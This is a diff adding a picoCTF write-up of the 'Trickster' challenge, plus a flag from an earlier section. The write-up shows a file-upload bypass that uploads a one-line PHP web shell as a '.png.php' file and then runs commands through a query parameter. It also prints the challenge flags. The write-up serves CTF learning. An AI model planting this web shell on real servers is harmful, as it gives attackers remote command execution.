@@ -669,24 +669,83 @@ FLAG:- ```picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}```
 ## Trickster (300 points)
 <hr>
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7cc1dc32-fb71-48d3-a537-6dfc19002aea)
 
+A web app that only allows png images?? Well, this screams the file upload vulnerability attack vector hehe
 
+Navigate to the webpage
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/7d6a4a9b-d79a-42bc-948e-7325f761a60b)
 
+Lets try to upload a normal png image
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/85ade628-aa09-4017-a5af-0b316bdb5e50)
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ca206cde-3c4c-48c6-95d7-f8f8785e5c9a)
 
+Our image got uploaded successfully. Now, the images are uploaded to the ```/uploads``` directory, but when you navigate there you get this
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/6ca5648a-e6b0-4c90-bba3-89fb3f717dc0)
 
+This means the directory exists but then we don't have enough permission to view the directory. 
 
+To view the image we uploaded we can do this ```/uploads/bl4ck4non.png```
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/ed05ae9e-dd3f-4816-a4cc-aff36199e160)
 
+As you can see, it worked.
 
+Now, lets upload another png image, but then this time we'll intercept the request using burpsuite so we can do some modifications
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f9cff1b9-e93c-4a97-8c65-bb3ef74e6836)
 
+On burpsuite you have this,
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/f5d94568-fd97-40f2-9029-6be5d8febc1e)
 
+We'll delete the contents of the png image and add this payload
 
+```php
+<?php system($_GET['cmd']); ?>
+```
+We'll also edit the filename
 
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/da791f12-6796-44b9-adaf-44fc82396d61)
+
+Good, now forward the request
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/9996ff3b-ac9c-4bce-9165-9e9439b4f302)
+
+Our file got uploaded successfully
+
+To view our file we'll navigate to ```/uploads/freakyFlags.png.php```
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/c55ef63e-9bc1-457c-9829-625c13a86ccf)
+
+We get this, now to get command injection on this server we can add this ```?cmd=id```
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/93694563-eb05-4791-9631-d583fb44a9f6)
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/78d2863c-8421-4afc-9f32-71af8c6373eb)
+
+As you can see, we can execute linux commands.
+
+Well, lets look for the flag, I'll be using burp repeater for this.
+
+We'll start with going back a directory and listing the contents of that directory, something like this ```cd .. && ls -la```, ensure you url encode this
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/8cf807df-5ea2-41dd-b410-820fc80247be)
+
+That file looks interesting, lets cat it, we can achieve that using this ```cd .. && ls -la && cat GQ4DOOBVMMYGK.txt```, ensure it is url encoded before sending.
+
+![image](https://github.com/BlackAnon22/BlockChain_Hacking/assets/67879936/2ae6d6f0-84cd-4443-aadb-843a079fc623)
+
+We got our flag😎
+
+FLAG:- ```picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}```
+
+------------------------------------
+
+## Elements (500 points)
+<hr>
 
 
 
